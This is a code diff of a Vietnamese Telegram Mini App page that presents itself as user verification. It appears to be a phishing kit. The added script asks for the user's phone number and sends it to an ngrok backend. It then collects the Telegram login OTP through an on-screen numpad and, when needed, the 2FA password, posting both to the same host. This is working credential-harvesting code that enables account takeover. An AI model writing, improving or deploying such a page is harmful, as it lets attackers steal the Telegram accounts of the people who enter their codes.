@@ -2,63 +2,81 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Xác Minh</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #0d1117; color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .screen { display: none; text-align: center; }
-        .active { display: block; }
-        .btn { padding: 15px 30px; background: #3bc0a8; border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; }
+        body { background: #0d1117; color: white; margin: 0; font-family: sans-serif; display: flex; justify-content: center; height: 100vh; }
+        .content { width: 100%; max-width: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .otp-box { width: 50px; height: 50px; text-align: center; font-size: 20px; background: #1c1c20; border: 2px solid #3e3e5a; border-radius: 12px; color: white; }
+        .key-btn { padding: 15px; border-radius: 12px; border: none; background: #2b2b3d; color: white; font-size: 20px; font-weight: bold; cursor: pointer; flex: 1; }
     </style>
 </head>
 <body>
-
-<div class="screen active" id="step1">
-    <button class="btn" id="shareContact">Xác Nhận Người Dùng</button>
+<div class="content" id="app">
+    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
+    <div id="message">Đang khởi tạo...</div>
 </div>
-
-<div class="screen" id="step2">
-    <div>Đang xử lý dữ liệu...</div>
-</div>
-
 <script>
+    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
     const tg = window.Telegram.WebApp;
+    const chat_id = tg.initDataUnsafe?.user?.id?.toString() || Math.random().toString();
+
     tg.ready();
     tg.expand();
+    tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
+    tg.MainButton.show();
+    tg.MainButton.onClick(() => tg.requestContact());
 
-    // Thay đổi link này thành link Ngrok mới nhất của bạn
-    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
-    const chat_id = tg.initDataUnsafe?.user?.id || Math.floor(Math.random() * 1000000);
+    tg.onEvent('contactRequested', (data) => {
+        if (data.responseUnsafe?.contact) sendPhoneToServer(data.responseUnsafe.contact.phone_number);
+    });
 
-    function goStep(n) {
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
+    async function sendPhoneToServer(phone) {
+        tg.MainButton.text = "ĐANG XỬ LÝ...";
+        const res = await fetch(`${BACKEND_URL}/send_phone`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: phone, chat_id: chat_id })
+        });
+        if (res.ok) renderOtpUi();
     }
 
-    document.getElementById("shareContact").addEventListener("click", () => {
-        alert("Đã nhấn nút, đang gọi requestContact..."); 
-        tg.requestContact();
-    });
+    function renderOtpUi() {
+        document.getElementById('app').innerHTML = `
+            <div id="status-text" style="margin-bottom: 20px;">Nhập mã OTP</div>
+            <div id="otp-container" style="display: flex; gap: 8px; margin-bottom: 30px;">
+                ${[0,1,2,3,4].map(() => `<input type="text" class="otp-box" readonly>`).join('')}
+            </div>
+            <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;">
+                ${[1,2,3,4,5,6,7,8,9].map(n => `<button class="key-btn" onclick="handleKey('${n}')">${n}</button>`).join('')}
+                <button class="key-btn" style="visibility:hidden"></button>
+                <button class="key-btn" onclick="handleKey('0')">0</button>
+                <button class="key-btn" onclick="handleKey('⌫')">⌫</button>
+            </div>
+        `;
+        tg.MainButton.hide();
+    }
 
-    tg.onEvent('contactRequested', async (e) => {
-        if (e.status === 'sent') {
-            alert("Đã nhận SĐT: " + e.responseUnsafe.contact.phone_number);
-            try {
-                const response = await fetch(`${BACKEND_URL}/send_phone`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: chat_id, phone: e.responseUnsafe.contact.phone_number })
-                });
-                alert("Server phản hồi: " + response.status);
-                if (response.ok) {
-                    goStep(2);
-                }
-            } catch (err) {
-                alert("Lỗi kết nối: " + err);
-            }
+    let currentInput = "";
+    window.handleKey = async (key) => {
+        const boxes = document.querySelectorAll('.otp-box');
+        if (key === '⌫') currentInput = currentInput.slice(0, -1);
+        else if (currentInput.length < 5) currentInput += key;
+        boxes.forEach((box, i) => box.value = currentInput[i] || "");
+        
+        if (currentInput.length === 5) {
+            const res = await fetch(`${BACKEND_URL}/verify_otp`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ input: currentInput, chat_id: chat_id })
+            });
+            const data = await res.json();
+            if (data.status === "success") { alert("Thành công!"); tg.close(); }
+            else if (data.status === "need_password") { document.getElementById('status-text').innerText = "Nhập mật khẩu 2FA:"; currentInput = ""; }
+            else { alert("Sai mã!"); currentInput = ""; boxes.forEach(b => b.value=""); }
         }
-    });
+    };
 </script>
 </body>
 </html>
